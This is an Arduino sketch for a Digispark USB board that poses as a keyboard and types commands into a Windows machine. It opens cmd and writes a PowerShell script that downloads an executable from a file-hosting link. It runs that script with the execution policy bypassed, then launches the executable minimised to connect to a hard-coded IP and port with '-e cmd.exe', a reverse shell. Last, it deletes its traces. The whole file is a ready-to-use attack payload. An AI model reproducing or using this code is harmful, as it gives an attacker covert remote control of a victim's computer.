#include "DigiKeyboard.h"
//dasferrus.github.io
void setup(){//turn LED off while code is running, device is safe to unplug as soon as the LED starts flashing
  pinMode(1, OUTPUT);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd / & mkdir bai1e & cd /bai1e & echo (wget 'https://1fichier.com/?dtc7uqmikl' -OutFile a.exe) > b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("START /MIN a.exe 138.247.205.221 666 -e cmd.exe -d");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("rm b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("rmdir bai1e & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  digitalWrite(1, HIGH);
  delay(50);
  
  digitalWrite(1, LOW);
  delay(50);  
}
